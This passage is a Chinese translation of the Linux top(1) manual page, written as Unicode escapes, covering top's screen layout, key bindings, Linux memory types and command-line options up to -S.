\u5bf9\u4e3b\u9898\u989c\u8272\u8fdb\u884c\u914d\u7f6e,\u8fdb\u5165\u914d\u7f6e\u754c\u9762\u540e\uff0c0-7\u9009\u62e9\u989c\u8272\uff0ca,w\u9009\u62e9\u663e\u793a\u5185\u5bb9\uff0c\u56de\u8f66\u4fdd\u5b58 q \u8fd4\u56de e \u5207\u6362\u5355\u4f4d E \u5207\u6362\u5355\u4f4d H \u5207\u6362\u7ebf\u7a0b\u663e\u793a\u6a21\u5f0f h \u67e5\u770b\u4ea4\u4e92\u547d\u4ee4\u5e2e\u52a9 top\uff081\uff09 - Linux \u624b\u518c\u9875 (man7.org) top\u7684man\u4e2d\u6587\u624b\u518c TOP(1) \u7528\u6237\u547d\u4ee4 TOP(1) \u540d\u79f0 top - \u663e\u793a Linux \u8fdb\u7a0b \u7b80\u4ecb top -hv|-bcEeHiOSs1 -d \u79d2 -n \u6b21\u6570 -u|U \u7528\u6237 -p \u8fdb\u7a0bID -o \u5b57\u6bb5 -w [\u5217] \u4f20\u7edf\u7684\u5f00\u5173 `-' \u548c\u7a7a\u767d\u7b26\u662f\u53ef\u9009\u7684\u3002 \u63cf\u8ff0 top \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u52a8\u6001\u7684\u5b9e\u65f6\u89c6\u56fe\uff0c\u53ef\u4ee5\u663e\u793a\u6b63\u5728\u8fd0\u884c\u7684\u7cfb\u7edf\u4fe1\u606f\u3002\u5b83\u53ef\u4ee5\u663e\u793a\u7cfb\u7edf\u6982\u8981\u4fe1\u606f\u4ee5\u53ca\u5f53\u524d\u7531 Linux \u5185\u6838\u7ba1\u7406\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u5217\u8868\u3002\u663e\u793a\u7684\u7cfb\u7edf\u6982\u8981\u4fe1\u606f\u7c7b\u578b\u4ee5\u53ca\u8fdb\u7a0b\u4fe1\u606f\u7684\u7c7b\u578b\u3001\u987a\u5e8f\u548c\u5927\u5c0f\u90fd\u53ef\u4ee5\u7531\u7528\u6237\u914d\u7f6e\uff0c \u5e76\u4e14\u8fd9\u79cd\u914d\u7f6e\u53ef\u4ee5\u5728\u91cd\u542f\u540e\u4fdd\u6301\u3002 \u8be5\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6709\u9650\u7684\u4ea4\u4e92\u754c\u9762\u7528\u4e8e\u8fdb\u7a0b\u64cd\u4f5c\uff0c\u5e76\u63d0\u4f9b\u4e86\u4e00\u4e2a\u66f4\u4e3a\u5e7f\u6cdb\u7684\u754c\u9762\u7528\u4e8e\u4e2a\u4eba\u914d\u7f6e\uff0c\u6db5\u76d6\u5176\u64cd\u4f5c\u7684\u5404\u4e2a\u65b9\u9762\u3002 \u867d\u7136\u672c\u6587\u6863\u4e2d\u63d0\u5230\u7684\u662f top\uff0c\u4f60\u53ef\u4ee5\u968f\u610f\u547d\u540d\u8be5\u7a0b\u5e8f\u3002\u8fd9\u4e2a\u65b0\u540d\u5b57\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u522b\u540d\uff0c\u5c06\u4f1a\u5728 top \u7684\u663e\u793a\u4e2d\u53cd\u6620\u51fa\u6765\uff0c \u5e76\u5728\u8bfb\u53d6\u548c\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u65f6\u4f7f\u7528\u3002 \u6982\u8ff0 \u6587\u6863 \u4f59\u4e0b\u7684\u76ee\u5f55 \u6982\u8ff0 \u64cd\u4f5c Linux \u5185\u5b58\u7c7b\u578b 1. \u547d\u4ee4\u884c\u9009\u9879 2. \u6982\u8981\u663e\u793a a. \u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u548c\u8d1f\u8f7d\u5e73\u5747\u503c b. \u4efb\u52a1\u548cCPU\u72b6\u6001 c. \u5185\u5b58\u4f7f\u7528\u60c5\u51b5 3. \u5b57\u6bb5/\u5217\u663e\u793a a. \u5b57\u6bb5\u63cf\u8ff0 b. \u7ba1\u7406\u5b57\u6bb5 4. \u4ea4\u4e92\u547d\u4ee4 a. \u5168\u5c40\u547d\u4ee4 b. \u6982\u8981\u533a\u57df\u547d\u4ee4 c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4 1. \u5916\u89c2 2. \u5185\u5bb9 3. \u5927\u5c0f 4. \u6392\u5e8f d. \u989c\u8272\u6620\u5c04 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879 a. \u7a97\u53e3\u6982\u8ff0 b. \u7a97\u53e3\u547d\u4ee4 c. \u7a97\u53e3\u6eda\u52a8 d. \u7a97\u53e3\u641c\u7d22 e. \u7a97\u53e3\u8fc7\u6ee4 6. \u6587\u4ef6 a. \u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6 b. \u6dfb\u52a0\u68c0\u67e5\u6761\u76ee c. \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6 d. \u7cfb\u7edf\u9650\u5236\u6587\u4ef6 7. \u4e00\u4e9b\u5947\u5999\u7684\u6280\u5de7 a. \u5185\u6838\u9b54\u672f b. \u7a97\u53e3\u5f39\u8df3 c. \u5927\u9e1f\u7a97\u53e3 d. \u4ea4\u6362\u7a97\u53e3 8. \u9519\u8bef, 9. \u53c2\u89c1 \u64cd\u4f5c \u5f53\u4f7f\u7528 top \u65f6\uff0c\u4e24\u4e2a\u6700\u91cd\u8981\u7684\u6309\u952e\u662f\u5e2e\u52a9\u952e (h \u6216 ? ) \u548c\u9000\u51fa\u952e (q)\u3002 \u53e6\u5916\uff0c\u5f53\u4f60\u5b8c\u6210\u65f6\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4f20\u7edf\u7684\u4e2d\u65ad\u952e (^C)\u3002 \u5f53\u7b2c\u4e00\u6b21\u542f\u52a8\u65f6\uff0c\u4f60\u5c06\u770b\u5230\u4e3b top \u5c4f\u5e55\u4e0a\u7684\u8fd9\u4e9b\u4f20\u7edf\u5143\u7d20\uff1a1\uff09\u6458\u8981\u533a\u57df\uff1b2\uff09\u5b57\u6bb5/\u5217\u6807\u9898\uff1b3\uff09\u4efb\u52a1\u533a\u57df\u3002 \u6bcf\u4e2a\u90e8\u5206\u5c06\u5728\u540e\u7eed\u90e8\u5206\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u3002\u5728\u6458\u8981\u533a\u57df\u548c\u5217\u6807\u9898\u4e4b\u95f4\u8fd8\u6709\u4e00\u4e2a\u8f93\u5165/\u6d88\u606f\u884c\uff0c\u4e0d\u9700\u8981\u8fdb\u4e00\u6b65\u89e3\u91ca\u3002 \u4e3b top \u5c4f\u5e55\u901a\u5e38\u975e\u5e38\u9002\u5e94 X-Windows \u4e0b\u7ec8\u7aef\u5c3a\u5bf8\u7684\u53d8\u5316\u3002\u5176\u4ed6 top \u5c4f\u5e55\u53ef\u80fd\u4e0d\u592a\u9002\u5e94\uff0c\u5c24\u5176\u662f\u90a3\u4e9b\u5305\u542b\u9759\u6001\u6587\u672c\u7684\u5c4f\u5e55\u3002 \u8fd9\u6700\u7ec8\u53d6\u51b3\u4e8e\u4f60\u7684\u7279\u5b9a\u7a97\u53e3\u7ba1\u7406\u5668\u548c\u7ec8\u7aef\u4eff\u771f\u5668\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u4ed6\u4eec\u5bf9\u7ec8\u7aef\u5927\u5c0f\u548c\u5f53\u524d\u5185\u5bb9\u7684\u770b\u6cd5\u53ef\u80fd\u4e0e top \u7684\u770b\u6cd5\u4e0d\u540c\uff0c top \u7684\u770b\u6cd5\u59cb\u7ec8\u57fa\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u8c03\u7528\u3002 \u4efb\u4f55\u91cd\u65b0\u8c03\u6574\u5927\u5c0f\u64cd\u4f5c\u540e\uff0c\u5982\u679c top \u5c4f\u5e55\u635f\u574f\u3001\u4e0d\u5b8c\u6574\u6216\u65e0\u5e8f\uff0c\u53ea\u9700\u952e\u5165\u4e00\u4e9b\u65e0\u5bb3\u7684\u5b57\u7b26\u6216\u5149\u6807\u79fb\u52a8\u952e\u901a\u5e38\u4f1a\u6062\u590d\u5b83\u3002 \u5728\u6781\u7aef\u60c5\u51b5\u4e0b\uff0c\u4ee5\u4e0b\u5e8f\u5217\u51e0\u4e4e\u80af\u5b9a\u4f1a\u6062\u590d\u5b83\uff1a \u952e/\u547d\u4ee4 \u76ee\u6807 ^Z \u6302\u8d77 top fg \u6062\u590d top <\u5de6\u952e> \u5f3a\u5236\u91cd\u65b0\u7ed8\u5236\u5c4f\u5e55\uff08\u5982\u679c\u9700\u8981\uff09 \u4f46\u5982\u679c\u663e\u793a\u4ecd\u7136\u635f\u574f\uff0c\u8fd8\u6709\u4e00\u6b65\u53ef\u4ee5\u5c1d\u8bd5\u3002\u5728\u6302\u8d77 top \u540e\u4f46\u5728\u6062\u590d\u5b83\u4e4b\u524d\u63d2\u5165\u6b64\u547d\u4ee4\uff1a \u952e/\u547d\u4ee4 \u76ee\u6807 reset \u6062\u590d\u7ec8\u7aef\u8bbe\u7f6e \u6ce8\u610f\uff1atop \u7684\u663e\u793a\u5bbd\u5ea6\u5c06\u9650\u5236\u4e3a 512 \u4e2a\u4f4d\u7f6e\u3002\u663e\u793a\u6240\u6709\u5b57\u6bb5\u5927\u7ea6\u9700\u8981 250 \u4e2a\u5b57\u7b26\u3002\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\u901a\u5e38\u5206\u914d\u7ed9\u5f53\u524d\u53ef\u89c1\u7684\u4efb\u4f55\u53ef\u53d8\u5bbd\u5ea6\u5217\u3002 \u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5217\uff0c\u5982 COMMAND\uff0c\u5728\u4e3b\u9898 3a. \u5b57\u6bb5\u63cf\u8ff0\u4e2d\u6709\u6240\u8bf4\u660e\u3002\u5b9e\u9645\u8f93\u51fa\u5bbd\u5ea6\u4e5f\u53ef\u80fd\u53d7 -w \u5f00\u5173\u5f71\u54cd\uff0c\u8be5\u5f00\u5173\u5728\u4e3b\u9898 1. \u547d\u4ee4\u884c\u9009\u9879\u4e2d\u8ba8\u8bba\u3002 \u6700\u540e\uff0ctop \u7684\u67d0\u4e9b\u5c4f\u5e55\u6216\u529f\u80fd\u9700\u8981\u4f7f\u7528\u5149\u6807\u79fb\u52a8\u952e\uff0c\u5982\u6807\u51c6\u7bad\u5934\u952e\u52a0 Home\u3001End\u3001PgUp \u548c PgDn \u952e\u3002 \u5982\u679c\u4f60\u7684\u7ec8\u7aef\u6216\u4eff\u771f\u5668\u6ca1\u6709\u63d0\u4f9b\u8fd9\u4e9b\u952e\uff0c\u53ef\u4ee5\u63a5\u53d7\u4ee5\u4e0b\u7ec4\u5408\u4f5c\u4e3a\u66ff\u4ee3\uff1a \u952e \u7b49\u6548\u952e \u5de6\u952e alt + h \u4e0b\u952e alt + j \u4e0a\u952e alt + k \u53f3\u952e alt + l Home alt + ctrl + h PgDn alt + ctrl + j PgUp alt + ctrl + k End alt + ctrl + l \u5728\u63d0\u793a\u8f93\u5165\u884c\u5e76\u4ee5 <Enter> \u952e\u7ec8\u6b62\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0a\u952e\u548c\u4e0b\u952e\u5177\u6709\u7279\u6b8a\u610f\u4e49\u3002\u90a3\u4e9b\u952e\u6216\u5176\u522b\u540d\u53ef\u7528\u4e8e\u68c0\u7d22\u4ee5\u524d\u7684\u8f93\u5165\u884c\uff0c\u7136\u540e\u53ef\u4ee5\u7f16\u8f91\u5e76\u91cd\u65b0\u8f93\u5165\u3002 \u8fd8\u6709\u56db\u4e2a\u989d\u5916\u7684\u952e\u53ef\u7528\u4e8e\u884c\u5b9a\u5411\u8f93\u5165\u3002 \u952e \u7279\u6b8a\u610f\u4e49 \u4e0a\u952e \u56de\u5fc6\u65e7\u5b57\u7b26\u4e32\u4ee5\u91cd\u65b0\u7f16\u8f91 \u4e0b\u952e \u56de\u5fc6\u65b0\u5b57\u7b26\u4e32\u6216\u5220\u9664\u6574\u884c Insert \u5728\u63d2\u5165\u548c\u8986\u76d6\u6a21\u5f0f\u4e4b\u95f4\u5207\u6362 Delete \u5220\u9664\u5149\u6807\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u79fb\u52a8\u5176\u4ed6\u5b57\u7b26\u5411\u5de6 Home \u8df3\u81f3\u8f93\u5165\u884c\u7684\u5f00\u5934 End \u8df3\u81f3\u8f93\u5165\u884c\u7684\u672b\u5c3e Linux \u5185\u5b58\u7c7b\u578b \u5bf9\u4e8e\u6211\u4eec\u7684\u76ee\u7684\uff0c\u6709\u4e09\u79cd\u7c7b\u578b\u7684\u5185\u5b58\uff0c\u4e00\u79cd\u662f\u53ef\u9009\u7684\u3002\u9996\u5148\u662f\u7269\u7406\u5185\u5b58\uff0c\u8fd9\u662f\u4e00\u4e2a\u6709\u9650\u7684\u8d44\u6e90\uff0c\u4ee3\u7801\u548c\u6570\u636e\u5728\u6267\u884c\u6216\u5f15\u7528\u65f6\u5fc5\u987b\u9a7b\u7559\u5176\u4e2d\u3002\u5176\u6b21\u662f\u53ef\u9009\u7684\u4ea4\u6362\u6587\u4ef6\uff0c\u4fee\u6539\uff08\u810f\uff09\u5185\u5b58\u53ef\u4ee5\u4fdd\u5b58\u5728\u5176\u4e2d\uff0c\u5982\u679c\u5bf9\u7269\u7406\u5185\u5b58\u7684\u9700\u6c42\u8fc7\u591a\uff0c\u53ef\u4ee5\u7a0d\u540e\u68c0\u7d22\u3002\u6700\u540e\u662f\u865a\u62df\u5185\u5b58\uff0c\u8fd9\u662f\u4e00\u4e2a\u51e0\u4e4e\u65e0\u9650\u7684\u8d44\u6e90\uff0c\u670d\u52a1\u4e8e\u4ee5\u4e0b\u76ee\u6807\uff1a 1. \u62bd\u8c61\uff0c\u65e0\u9700\u7269\u7406\u5185\u5b58\u5730\u5740/\u9650\u5236 2. \u9694\u79bb\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5728\u4e00\u4e2a\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4 3. \u5171\u4eab\uff0c\u4e00\u4e2a\u6620\u5c04\u53ef\u4ee5\u6ee1\u8db3\u591a\u4e2a\u9700\u6c42 4. \u7075\u6d3b\u6027\uff0c\u5c06\u865a\u62df\u5730\u5740\u5206\u914d\u7ed9\u6587\u4ef6 \u65e0\u8bba\u8fd9\u4e9b\u5f62\u5f0f\u7684\u5185\u5b58\u662f\u54ea\u79cd\uff0c\u6240\u6709\u7684\u5185\u5b58\u90fd\u4f5c\u4e3a\u9875\u9762\uff08\u901a\u5e38\u4e3a 4096 \u5b57\u8282\uff09\u8fdb\u884c\u7ba1\u7406\uff0c\u4f46\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5728 top \u4e2d\u4ee5 KiB\uff08\u5343\u5b57\u8282\uff09\u8868\u793a\u3002 \u5728\u4e3b\u9898 `2c. \u5185\u5b58\u4f7f\u7528` \u4e2d\u8ba8\u8bba\u7684\u5185\u5b58\u5904\u7406\u7684\u662f\u6574\u4e2a\u7cfb\u7edf\u7684\u7269\u7406\u5185\u5b58\u548c\u4ea4\u6362\u6587\u4ef6\u3002\u5728\u4e3b\u9898 `3. \u5b57\u6bb5/\u5217\u663e\u793a` \u4e2d\u5ba1\u67e5\u7684\u5185\u5b58\u6db5\u76d6\u4e86\u4e09\u79cd\u5185\u5b58\u7c7b\u578b\uff0c\u4f46\u9488\u5bf9\u7684\u662f\u5355\u4e2a\u8fdb\u7a0b\u3002 \u5bf9\u4e8e\u6bcf\u4e2a\u8fd9\u6837\u7684\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u5185\u5b58\u9875\u9762\u9650\u5236\u5728\u4e0b\u9762\u8868\u683c\u4e2d\u7684\u4e00\u4e2a\u8c61\u9650\u4e2d\u3002\u7269\u7406\u5185\u5b58\u548c\u865a\u62df\u5185\u5b58\u53ef\u4ee5\u5305\u542b\u4efb\u4f55\u56db\u4e2a\u8c61\u9650\uff0c\u800c\u4ea4\u6362\u6587\u4ef6\u53ea\u5305\u542b\u7b2c1\u5230\u7b2c3\u8c61\u9650\u3002 \u5f53\u4fee\u6539\u65f6\uff0c\u7b2c4\u8c61\u9650\u4e2d\u7684\u5185\u5b58\u5c06\u4f5c\u4e3a\u5176\u81ea\u5df1\u7684\u4e13\u7528\u4ea4\u6362\u6587\u4ef6\u3002 \u79c1\u6709 | \u5171\u4eab 1 | 2 \u533f\u540d . \u5806\u6808 | . malloc() | . brk()/sbrk() | . POSIX shm* . mmap(PRIVATE, ANON) | . mmap(SHARED, ANON) -----------------------+---------------------- . mmap(PRIVATE, fd) | . mmap(SHARED, fd) \u6587\u4ef6\u652f\u6301 . \u7a0b\u5e8f/\u5171\u4eab\u5e93 | 3 | 4 \u4ee5\u4e0b\u53ef\u80fd\u6709\u52a9\u4e8e\u89e3\u91ca\u8fdb\u7a0b\u7ea7\u5185\u5b58\u503c\uff0c\u8fd9\u4e9b\u503c\u663e\u793a\u4e3a\u53ef\u6269\u5c55\u5217\u5e76\u5728\u4e3b\u9898 `3a. \u5b57\u6bb5\u63cf\u8ff0` \u4e2d\u8ba8\u8bba\u3002 %MEM - \u7b80\u5355\u5730\u8bf4\u662f RES \u9664\u4ee5\u603b\u7269\u7406\u5185\u5b58 CODE - \u8c61\u9650 3 \u7684 `\u7a0b\u5e8f` \u90e8\u5206 DATA - \u8c61\u9650 1 \u7684 VIRT \u5168\u90e8\u52a0\u4e0a\u8c61\u9650 3 \u7684\u6240\u6709\u663e\u5f0f mmap \u6587\u4ef6\u652f\u6301\u9875\u9762 RES - \u5360\u7528\u7269\u7406\u5185\u5b58\u7684\u4efb\u4f55\u5185\u5bb9\uff0c\u4ece Linux-4.5 \u5f00\u59cb\uff0c\u662f\u4ee5\u4e0b\u4e09\u4e2a\u5b57\u6bb5\u7684\u603b\u548c\uff1a RSan - \u8c61\u9650 1 \u9875\u9762\uff0c\u5305\u62ec\u4efb\u4f55\u4fee\u6539\u8fc7\u7684\u524d\u8c61\u9650 3 \u9875\u9762 RSfd - \u8c61\u9650 3 \u548c\u8c61\u9650 4 \u9875\u9762 RSsh - \u8c61\u9650 2 \u9875\u9762 RSlk - \u4e0d\u80fd\u4ea4\u6362\u51fa\u7684 RES \u5b50\u96c6\uff08\u4efb\u4f55\u8c61\u9650\uff09 SHR - RES \u7684\u5b50\u96c6\uff08\u4e0d\u5305\u62ec 1\uff0c\u5305\u542b\u6240\u6709 2 \u548c 4\uff0c\u4e00\u4e9b 3\uff09 SWAP - \u53ef\u80fd\u662f\u9664 4 \u4e4b\u5916\u7684\u4efb\u4f55\u8c61\u9650 USED - \u7b80\u5355\u5730\u8bf4\u662f RES \u548c SWAP \u7684\u603b\u548c VIRT - \u6240\u6709\u5728\u7528\u548c/\u6216\u4fdd\u7559\u7684\uff08\u6240\u6709\u8c61\u9650\uff09 \u6ce8\u610f\uff1a\u5373\u4f7f\u7a0b\u5e8f\u6620\u50cf\u548c\u5171\u4eab\u5e93\u88ab\u89c6\u4e3a\u8fdb\u7a0b\u79c1\u6709\uff0c\u5b83\u4eec\u4e5f\u4f1a\u88ab\u5185\u6838\u8bb0\u4f5c\u5171\u4eab\uff08SHR\uff09\u3002 1. \u547d\u4ee4\u884c\u9009\u9879 top \u7684\u547d\u4ee4\u884c\u8bed\u6cd5\u5982\u4e0b\uff1a -hv|-bcEeHiOSs1 -d \u79d2 -n \u6b21\u6570 -u|U \u7528\u6237 -p \u8fdb\u7a0bID -o \u5b57\u6bb5 -w [\u5217] \u901a\u5e38\u5fc5\u9700\u7684\u5f00\u5173 (`-`) \u751a\u81f3\u7a7a\u767d\u7b26\u90fd\u662f\u53ef\u9009\u7684\u3002 -h | -v :\u5e2e\u52a9/\u7248\u672c \u663e\u793a\u5e93\u7248\u672c\u548c\u4f7f\u7528\u63d0\u793a\uff0c\u7136\u540e\u9000\u51fa\u3002 -b :\u6279\u5904\u7406\u6a21\u5f0f\u64cd\u4f5c \u4ee5\u6279\u5904\u7406\u6a21\u5f0f\u542f\u52a8 top\uff0c\u8fd9\u5bf9\u4e8e\u5c06 top \u7684\u8f93\u51fa\u53d1\u9001\u5230\u5176\u4ed6\u7a0b\u5e8f\u6216\u6587\u4ef6\u53ef\u80fd\u5f88\u6709\u7528\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\uff0ctop \u4e0d\u63a5\u53d7\u8f93\u5165\uff0c \u5e76\u8fd0\u884c\u76f4\u5230\u4f60\u7528 `-n` \u547d\u4ee4\u884c\u9009\u9879\u8bbe\u7f6e\u7684\u8fed\u4ee3\u6b21\u6570\u9650\u5236\uff0c\u6216\u76f4\u5230\u88ab\u6740\u6b7b\u3002 -c :\u547d\u4ee4\u884c/\u7a0b\u5e8f\u540d\u79f0\u5207\u6362 \u542f\u52a8 top \u65f6\uff0c\u6700\u540e\u8bb0\u4f4f\u7684 `c` \u72b6\u6001\u53cd\u8f6c\u3002\u56e0\u6b64\uff0c\u5982\u679c top \u663e\u793a\u547d\u4ee4\u884c\uff0c\u90a3\u4e48\u8be5\u5b57\u6bb5\u5c06\u663e\u793a\u7a0b\u5e8f\u540d\u79f0\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `c` \u4ea4\u4e92\u547d\u4ee4\u3002 -d :\u5ef6\u8fdf\u65f6\u95f4\u95f4\u9694\uff1a-d ss.t (\u79d2.\u5341\u5206\u4e4b\u4e00\u79d2) \u6307\u5b9a\u5c4f\u5e55\u66f4\u65b0\u4e4b\u95f4\u7684\u5ef6\u8fdf\uff0c\u5e76\u8986\u76d6\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u76f8\u5e94\u503c\u6216\u542f\u52a8\u9ed8\u8ba4\u503c\u3002\u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528 `d` \u6216 `s` \u4ea4\u4e92\u547d\u4ee4\u66f4\u6539\u3002 \u5206\u6570\u79d2\u662f\u6709\u6548\u7684\uff0c\u4f46\u4e0d\u5141\u8bb8\u8d1f\u6570\u3002\u7136\u800c\uff0c\u5982\u679c top \u4ee5\u5b89\u5168\u6a21\u5f0f\u8fd0\u884c\uff0c\u9664\u4e86 root \u4e4b\u5916\uff08\u9664\u975e\u4f7f\u7528\u4e86 `s` \u547d\u4ee4\u884c\u9009\u9879\uff09\uff0c\u5219\u7981\u6b62\u8fdb\u884c\u8fd9\u4e9b\u66f4\u6539\u3002 \u6709\u5173\u5b89\u5168\u6a21\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 6d. \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u3002 -e :\u5f3a\u5236\u4efb\u52a1\u5185\u5b58\u7f29\u653e\uff1a-e k | m | g | t | p \u6307\u793a top \u5f3a\u5236\u4efb\u52a1\u533a\u57df\u5185\u5b58\u6309\u4ee5\u4e0b\u5355\u4f4d\u7f29\u653e\uff1a k - \u5343\u5b57\u8282 m - \u5146\u5b57\u8282 g - \u5409\u5b57\u8282 t - \u592a\u5b57\u8282 p - \u62cd\u5b57\u8282 \u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528 `e` \u547d\u4ee4\u5207\u6362\u66f4\u6539\u3002 -E :\u5f3a\u5236\u6458\u8981\u5185\u5b58\u7f29\u653e\uff1a-E k | m | g | t | p | e \u6307\u793a top \u5f3a\u5236\u6458\u8981\u533a\u57df\u5185\u5b58\u6309\u4ee5\u4e0b\u5355\u4f4d\u7f29\u653e\uff1a k - \u5343\u5b57\u8282 m - \u5146\u5b57\u8282 g - \u5409\u5b57\u8282 t - \u592a\u5b57\u8282 p - \u62cd\u5b57\u8282 e - \u827e\u5b57\u8282 \u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528 `E` \u547d\u4ee4\u5207\u6362\u66f4\u6539\u3002 -H :\u7ebf\u7a0b\u6a21\u5f0f\u64cd\u4f5c \u6307\u793a top \u663e\u793a\u5355\u4e2a\u7ebf\u7a0b\u3002\u5982\u679c\u6ca1\u6709\u6b64\u547d\u4ee4\u884c\u9009\u9879\uff0c\u5219\u663e\u793a\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u6240\u6709\u7ebf\u7a0b\u7684\u6c47\u603b\u3002\u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528 `H` \u4ea4\u4e92\u547d\u4ee4\u66f4\u6539\u3002 -i :\u7a7a\u95f2\u8fdb\u7a0b\u5207\u6362 \u542f\u52a8 top \u65f6\uff0c\u6700\u540e\u8bb0\u4f4f\u7684 `i` \u72b6\u6001\u53cd\u8f6c\u3002\u5f53\u6b64\u5207\u6362\u4e3a\u5173\u95ed\u65f6\uff0c\u81ea\u4e0a\u6b21\u66f4\u65b0\u4ee5\u6765\u672a\u4f7f\u7528\u4efb\u4f55 CPU \u7684\u4efb\u52a1\u5c06\u4e0d\u4f1a\u663e\u793a\u3002 \u6709\u5173\u6b64\u5207\u6362\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4\uff0c\u5927\u5c0f\u3002 -n :\u8fed\u4ee3\u6b21\u6570\u9650\u5236\uff1a-n \u6b21\u6570 \u6307\u5b9a top \u5e94\u751f\u6210\u7684\u6700\u5927\u8fed\u4ee3\u6b21\u6570\u6216\u5e27\u6570\uff0c\u7136\u540e\u7ed3\u675f\u3002 -o :\u8986\u76d6\u6392\u5e8f\u5b57\u6bb5\uff1a-o \u5b57\u6bb5\u540d \u6307\u5b9a\u4efb\u52a1\u5c06\u6309\u5176\u6392\u5e8f\u7684\u5b57\u6bb5\u540d\u79f0\uff0c\u4e0e\u914d\u7f6e\u6587\u4ef6\u4e2d\u53cd\u6620\u7684\u65e0\u5173\u3002\u4f60\u53ef\u4ee5\u5728\u5b57\u6bb5\u540d\u4e4b\u524d\u52a0\u4e0a `+` \u6216 `-` \u4ee5\u8986\u76d6\u6392\u5e8f\u65b9\u5411\u3002 \u4ee5 `+` \u5f00\u5934\u5c06\u5f3a\u5236\u4ece\u9ad8\u5230\u4f4e\u6392\u5e8f\uff0c\u800c `-` \u5c06\u786e\u4fdd\u4ece\u4f4e\u5230\u9ad8\u6392\u5e8f\u3002 \u6b64\u9009\u9879\u4e3b\u8981\u7528\u4e8e\u652f\u6301\u81ea\u52a8/\u811a\u672c\u5316\u6279\u5904\u7406\u6a21\u5f0f\u64cd\u4f5c\u3002 -O :\u8f93\u51fa\u5b57\u6bb5\u540d\u79f0 \u6b64\u9009\u9879\u5145\u5f53\u4e0a\u8ff0 -o \u9009\u9879\u7684\u4e00\u79cd\u5e2e\u52a9\u3002\u5b83\u5c06\u4f7f top \u6253\u5370\u6bcf\u4e2a\u53ef\u7528\u7684\u5b57\u6bb5\u540d\u79f0\u5728\u5355\u72ec\u7684\u884c\u4e0a\uff0c\u7136\u540e\u9000\u51fa\u3002 \u8fd9\u4e9b\u540d\u79f0\u53d7 NLS\uff08\u56fd\u5bb6\u8bed\u8a00\u652f\u6301\uff09\u7ffb\u8bd1\u7684\u5f71\u54cd\u3002 -p :\u76d1\u89c6\u8fdb\u7a0bID\u6a21\u5f0f\uff1a-pN1 -pN2 ... \u6216 -pN1,N2,N3 ... \u4ec5\u76d1\u89c6\u5177\u6709\u6307\u5b9a\u8fdb\u7a0bID\u7684\u8fdb\u7a0b\u3002\u6b64\u9009\u9879\u53ef\u4ee5\u7ed9\u51fa\u591a\u8fbe 20 \u6b21\uff0c\u6216\u8005\u4f60\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u6700\u591a\u5305\u542b 20 \u4e2a\u8fdb\u7a0bID\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\u3002 \u53ef\u4ee5\u540c\u65f6\u4f7f\u7528\u4e24\u79cd\u65b9\u6cd5\u3002 \u8fdb\u7a0bID\u503c\u4e3a\u96f6\u5c06\u88ab\u89c6\u4e3a top \u7a0b\u5e8f\u672c\u8eab\u5728\u8fd0\u884c\u65f6\u7684\u8fdb\u7a0bID\u3002 \u8fd9\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u9009\u9879\uff0c\u5982\u679c\u4f60\u5e0c\u671b\u8fd4\u56de\u6b63\u5e38\u64cd\u4f5c\uff0c\u65e0\u9700\u9000\u51fa\u5e76\u91cd\u65b0\u542f\u52a8 top -- \u53ea\u9700\u53d1\u51fa\u4ee5\u4e0b\u4efb\u4f55\u4e00\u4e2a\u4ea4\u4e92\u547d\u4ee4\uff1a`=`\u3001`u` \u6216 `U`\u3002 `p`\u3001`u` \u548c `U` \u547d\u4ee4\u884c\u9009\u9879\u662f\u4e92\u65a5\u7684\u3002 -s :\u5b89\u5168\u6a21\u5f0f\u64cd\u4f5c \u5f3a\u5236\u4ee5\u5b89\u5168\u6a21\u5f0f\u542f\u52a8 top\uff0c\u5373\u4f7f\u662f root \u4e5f\u662f\u5982\u6b64\u3002\u6b64\u6a21\u5f0f\u901a\u8fc7\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u66f4\u597d\u5730\u63a7\u5236\uff08\u89c1\u4e3b\u9898 6. \u6587\u4ef6\uff09\u3002 -S :\u7d2f\u79ef\u65f6\u95f4\u5207\u6362 \u542f\u52a8 top \u65f6\uff0c\u6700\u540e\u8bb0\u4f4f\u7684 `S` 